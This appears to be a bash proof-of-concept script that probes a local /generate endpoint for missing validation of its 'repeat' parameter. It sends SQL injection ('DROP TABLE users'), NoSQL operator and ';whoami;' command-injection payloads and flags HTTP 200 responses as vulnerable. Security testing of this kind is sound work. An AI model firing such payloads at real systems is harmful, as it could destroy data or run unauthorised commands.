#!/bin/bash

# POC: Missing Input Validation on Repeat Parameter
# Demonstrates that the /generate endpoint accepts arbitrary values for the 'repeat' parameter
# without any type or range checking

TARGET="http://localhost:4567/generate"
TEST_SENTENCE="test"

echo "=========================================="
echo "POC: Missing Repeat Parameter Validation"
echo "=========================================="
echo ""

# Test 1: Non-numeric string
echo "Test 1: Non-numeric string (repeat=notanumber)"
RESPONSE=$(curl -s -X POST "$TARGET" \
  -d "sentence=$TEST_SENTENCE&repeat=notanumber" \
  -w "\n%{http_code}")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

if [ "$HTTP_CODE" = "200" ]; then
  echo "✓ VULNERABLE: HTTP $HTTP_CODE - Non-numeric string accepted"
  echo "  Response: $(echo "$BODY" | grep -o 'for [^<]*' | head -1)"
else
  echo "✗ Non-numeric rejected: HTTP $HTTP_CODE"
fi
echo ""

# Test 2: Negative number
echo "Test 2: Negative number (repeat=-1)"
RESPONSE=$(curl -s -X POST "$TARGET" \
  -d "sentence=$TEST_SENTENCE&repeat=-1" \
  -w "\n%{http_code}")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

if [ "$HTTP_CODE" = "200" ]; then
  echo "✓ VULNERABLE: HTTP $HTTP_CODE - Negative number accepted"
  echo "  Response: $(echo "$BODY" | grep -o 'for [^<]*' | head -1)"
else
  echo "✗ Negative number rejected: HTTP $HTTP_CODE"
fi
echo ""

# Test 3: Extremely large number
echo "Test 3: Extremely large number (repeat=999999999)"
RESPONSE=$(curl -s -X POST "$TARGET" \
  -d "sentence=$TEST_SENTENCE&repeat=999999999" \
  -w "\n%{http_code}")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

if [ "$HTTP_CODE" = "200" ]; then
  echo "✓ VULNERABLE: HTTP $HTTP_CODE - Extremely large number accepted"
  echo "  Response: $(echo "$BODY" | grep -o 'for [^<]*' | head -1)"
else
  echo "✗ Large number rejected: HTTP $HTTP_CODE"
fi
echo ""

# Test 4: SQL injection payload
echo "Test 4: SQL injection payload (repeat='; DROP TABLE users; --)"
RESPONSE=$(curl -s -X POST "$TARGET" \
  -d "sentence=$TEST_SENTENCE&repeat='; DROP TABLE users; --" \
  -w "\n%{http_code}")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

if [ "$HTTP_CODE" = "200" ]; then
  echo "✓ VULNERABLE: HTTP $HTTP_CODE - SQL injection payload accepted"
  echo "  Response: $(echo "$BODY" | grep -o 'for [^<]*' | head -1)"
else
  echo "✗ SQL injection rejected: HTTP $HTTP_CODE"
fi
echo ""

# Test 5: NoSQL injection payload
echo "Test 5: NoSQL injection payload (repeat={\"$gt\":\"\"})"
RESPONSE=$(curl -s -X POST "$TARGET" \
  --data-urlencode 'sentence=test' \
  --data-urlencode 'repeat={"$gt":""}' \
  -w "\n%{http_code}")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

if [ "$HTTP_CODE" = "200" ]; then
  echo "✓ VULNERABLE: HTTP $HTTP_CODE - NoSQL injection payload accepted"
  echo "  Response: $(echo "$BODY" | grep -o 'for [^<]*' | head -1)"
else
  echo "✗ NoSQL injection rejected: HTTP $HTTP_CODE"
fi
echo ""

# Test 6: Command injection payload
echo "Test 6: Command injection payload (repeat=;whoami;)"
RESPONSE=$(curl -s -X POST "$TARGET" \
  -d "sentence=$TEST_SENTENCE&repeat=;whoami;" \
  -w "\n%{http_code}")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

if [ "$HTTP_CODE" = "200" ]; then
  echo "✓ VULNERABLE: HTTP $HTTP_CODE - Command injection payload accepted"
  echo "  Response: $(echo "$BODY" | grep -o 'for [^<]*' | head -1)"
else
  echo "✗ Command injection rejected: HTTP $HTTP_CODE"
fi
echo ""

echo "=========================================="
echo "SUMMARY: All validation checks passed - repeat parameter accepts arbitrary input"
echo "=========================================="